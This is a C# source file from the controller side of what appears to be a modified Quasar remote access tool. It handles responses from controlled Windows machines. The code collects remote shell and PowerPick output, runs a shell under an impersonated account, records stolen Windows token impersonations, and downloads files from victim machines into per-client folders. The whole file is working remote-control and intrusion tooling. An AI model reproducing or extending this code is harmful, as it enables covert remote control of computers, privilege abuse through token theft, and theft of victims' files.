using System;
using xServer.Core.Data;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;
using xServer.Core.Utilities;
using xServer.Forms;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {

        public static void HandleGetPowerPick(GetPowerPick packet, Client client)
        {
            if (client.Value == null || client.Value.FrmPP == null || string.IsNullOrEmpty(packet.Output))
                return;

            if (packet.IsError)
            {
                //Need to figure out if it will ever throw an error?
                client.Value.FrmPP.PrintError(packet.Output);
            }
            else
            {
                client.Value.FrmPP.PrintMessage(packet.Output);
            }

        }
        public static void HandleDoShellExecuteResponse(Client client, DoShellExecuteResponse packet)
        {
            if (client.Value == null || (client.Value.FrmRs == null && client.Value.FrmIm == null) || string.IsNullOrEmpty(packet.Output))
                return;


            //This "should" work.
            if (packet.Impersonate)
            {
                //Redirect to FrmShellImpersonate
                if (packet.IsError)
                {
                    client.Value.FrmIm.PrintError(packet.Output);
                    return;
                    //QuasarServer.writeLog(packet.Output.Replace(System.Environment.NewLine, "<NL>"), client.Value.PCName);

                }
                else
                {
                    //Interesting FrmRs probably is the form that called the information so I can redirect input back to that.
                    client.Value.FrmIm.PrintMessage(packet.Output);
                    return;
                    //QuasarServer.writeLog(packet.Output, client.Value.PCName);
                }
            }
            else
            {
                if (packet.IsError)
                {
                    client.Value.FrmRs.PrintError(packet.Output);
                    return;
                    //QuasarServer.writeLog(packet.Output.Replace(System.Environment.NewLine, "<NL>"), client.Value.PCName);

                }
                else
                {
                    //Interesting FrmRs probably is the form that called the information so I can redirect input back to that.
                    client.Value.FrmRs.PrintMessage(packet.Output);
                    return;
                    //QuasarServer.writeLog(packet.Output, client.Value.PCName);
                }
            }
        }
        public static void HandleDoChangeTokenResponse(GetChangeToken packet, Client client)
        {
            if (packet.execSuccess)
            {
                //This may not be the most elegant solution, but it works damn it.
                string[] strings = packet.impersonatedUser.Split('\\');
                //Will these three things be enough for a unique ID?
                Impersonation user = new Impersonation(strings[0],strings[1],client.Value.Id, packet.guid);
                FrmMain.Instance.SetStatusByClient(client, "Successfully Created a token for " + user.username);
                //Maybe try something else for unique ID generation (GUID?)
                FrmMain.Instance.impersonatedUsers.Add("Impersonation - "+FrmMain.Instance.impersonatedUsers.Count+1.ToString(), user);
            }
            else
            {
                FrmMain.Instance.SetStatusByClient(client, "Token change failed.");
            }
        }

        public static void HandleDoDownloadFileResponse(Client client, DoDownloadFileResponse packet)
        {
            if (CanceledDownloads.ContainsKey(packet.ID) || string.IsNullOrEmpty(packet.Filename))
                return;

            if (!Directory.Exists(client.Value.DownloadDirectory))
                Directory.CreateDirectory(client.Value.DownloadDirectory);

            string downloadPath = Path.Combine(client.Value.DownloadDirectory, packet.Filename);
            QuasarServer.writeLog("Downloading " + packet.Filename + " to " + client.Value.DownloadDirectory, client.Value.PCName);

            if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
            {
                for (int i = 1; i < 100; i++)
                {
                    var newFileName = string.Format("{0} ({1}){2}", Path.GetFileNameWithoutExtension(downloadPath), i, Path.GetExtension(downloadPath));
                    if (File.Exists(Path.Combine(client.Value.DownloadDirectory, newFileName))) continue;

                    downloadPath = Path.Combine(client.Value.DownloadDirectory, newFileName);
                    RenamedFiles.Add(packet.ID, newFileName);
                    break;
                }
            }
            else if (packet.CurrentBlock > 0 && File.Exists(downloadPath) && RenamedFiles.ContainsKey(packet.ID))
            {
                downloadPath = Path.Combine(client.Value.DownloadDirectory, RenamedFiles[packet.ID]);
            }

            if (client.Value == null || client.Value.FrmFm == null)
            {
                FrmMain.Instance.SetStatusByClient(client, "Download aborted, please keep the File Manager open.");
                QuasarServer.writeLog("Download aborted, please keep the File Manager open.", client.Value.PCName);
                new Packets.ServerPackets.DoDownloadFileCancel(packet.ID).Execute(client);
                return;
            }

            int index = client.Value.FrmFm.GetTransferIndex(packet.ID);
            if (index < 0)
                return;

            if (!string.IsNullOrEmpty(packet.CustomMessage))
            {
                if (client.Value.FrmFm == null)
                { // abort download when form is closed
                    QuasarServer.writeLog("Download aborted (CLOSED FORM).", client.Value.PCName);
                    return;
                }

                client.Value.FrmFm.UpdateTransferStatus(index, packet.CustomMessage, 0);
                return;
            }

            FileSplit destFile = new FileSplit(downloadPath);
            if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
            {
                if (client.Value == null || client.Value.FrmFm == null)
                    return;

                client.Value.FrmFm.UpdateTransferStatus(index, destFile.LastError, 0);
                return;
            }

            decimal progress =
                Math.Round((decimal) ((double) (packet.CurrentBlock + 1)/(double) packet.MaxBlocks*100.0), 2);

            if (client.Value == null || client.Value.FrmFm == null)
                return;

            if (CanceledDownloads.ContainsKey(packet.ID)) return;

            client.Value.FrmFm.UpdateTransferStatus(index, string.Format("Downloading...({0}%)", progress), -1);

            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
            {
                if (client.Value.FrmFm == null)
                    return;
                RenamedFiles.Remove(packet.ID);
                client.Value.FrmFm.UpdateTransferStatus(index, "Completed", 1);
                QuasarServer.writeLog("Finished Downloading " + packet.Filename, client.Value.PCName);

            }
        }

        public static void HandleSetStatusFileManager(Client client, SetStatusFileManager packet)
        {
            if (client.Value == null || client.Value.FrmFm == null) return;

            client.Value.FrmFm.SetStatus(packet.Message, packet.SetLastDirectorySeen);
        }

        public static void HandleGetMessageResponse(Packets.ClientPackets.GetMessageResponse command, Client client)
        {

            var agentChat = (Forms.FrmChatLog)Application.OpenForms["FrmChatLog"];
            if (agentChat != null)
            {
                agentChat.AddMessage(command.Message + "\r\n", "Agent");
            }
        }

        public static void HandleGetStopChatAgent(Packets.ClientPackets.GetStopChatAgent command, Client client)
        {
            //Kill Form
            var agentChat = (Forms.FrmChatLog)Application.OpenForms["FrmChatLog"];
            if (agentChat != null)
            {
                agentChat.AddMessage(" has left the chat, please close the window", "Server");
            }
        }
    }
}